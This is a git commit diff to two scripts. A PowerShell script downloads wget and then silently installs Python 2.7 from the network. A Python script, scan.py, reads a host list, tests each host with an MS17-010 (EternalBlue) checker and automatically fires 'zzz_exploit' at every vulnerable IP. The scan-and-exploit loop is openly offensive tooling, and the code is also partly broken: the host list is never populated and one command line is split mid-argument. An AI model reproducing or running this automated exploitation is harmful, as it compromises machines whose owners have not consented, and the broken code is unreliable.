5a5881b7c7daed86184f660f27eb00d745309f91
M <Mohammed10work@gmail.com>
2019-03-27 20:33:19 -0400

    Fix DPython.ps1

--- Scripts/DownloadPython.ps1
+++ Scripts/DownloadPython.ps1
@@ -1,15 +1,46 @@
+# TODO
 # Add x84 and x64 options
 
-Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\1.msi"
- -passthru -NoNewWindow -Wait -WindowStyle hidden
-Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi"
- -passthru -NoNewWindow -Wait -WindowStyle hidden
-Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\3.msi"
- -passthru -NoNewWindow -Wait -WindowStyle hidden
+# Setup
+$save_dir = $env:temp
+#$save_path = '' + $save_dir + '\' + $filename;
 
-Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\1.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
-Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\2.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
-Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\3.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
 
+function get_wget {
+        $filename = "wget.exe"
+        $wgetBinLocation = '' + $save_dir + '\' + $filename;
+        #$client = New-Object System.Net.WebClient
+        #https://eternallybored.org/misc/wget/
+        write-host "Downloading Wget!"
+        $url = "https://eternallybored.org/misc/wget/1.20/32/wget.exe"
+        (New-Object System.Net.WebClient).DownloadFile($url, $wgetBinLocation)
+        return $wgetBinLocation
+}
+
+
+$wgetBinLocation = get_wget
+
+1..1 | % {
+# Downlaod
+$filename = "$_" + ".msi"
+$Location = '' + $save_dir + '\' + $filename;
+Start-Process -FilePath $wgetBinLocation -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O $Location" -passthru -N
+oNewWindow -Wait
+# Install
+Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
+}
+
+
+
+#$filename = "wget.exe"
+#$Location = '' + $save_dir + '\' + $filename;
+#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\2.msi
+" -passthru -NoNewWindow -Wait -WindowStyle hidden
+#Start-Process -FilePath $wgetBinLocation  -Args " https://www.python.org/ftp/python/2.7/python-2.7.msi -O C:\Windows\Temp\3.msi
+" -passthru -NoNewWindow -Wait -WindowStyle hidden
+
+#Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
+#Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\2.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
+#Start-Process -FilePath "msiexec.exe"  -Args "/a C:\Windows\Temp\3.msi /qb TARGETDIR=C:\python27" -passthru -NoNewWindow -Wait
 
 #iex "msiexec /a C:\Windows\Temp\1.msi /qb TARGETDIR=C:\python27"
--- Scripts/scan.py
+++ Scripts/scan.py
@@ -1,5 +1,25 @@
+from MS17_010 import checker
+from MS17_010 import zzz_exploit
 
 # Get all active hosts
+allActiveHosts = []
 try:
-    for line in open("IPList.txt"):
-        line
+    for line in open("test.txt"):
+        line = line.split(" ")
+        print(line)
+except:
+    print("No file to read exit(-1)")
+    exit(-1)
+
+def scan_for_ms17010():
+    for ip in allActiveHosts:
+        if checker.check(ip):
+            zzz_exploit.exploit(ip,None)
+            print(ip)
+        else:
+            print("NOPE")
+
+def main():
+    scan_for_ms17010()
+
+main()
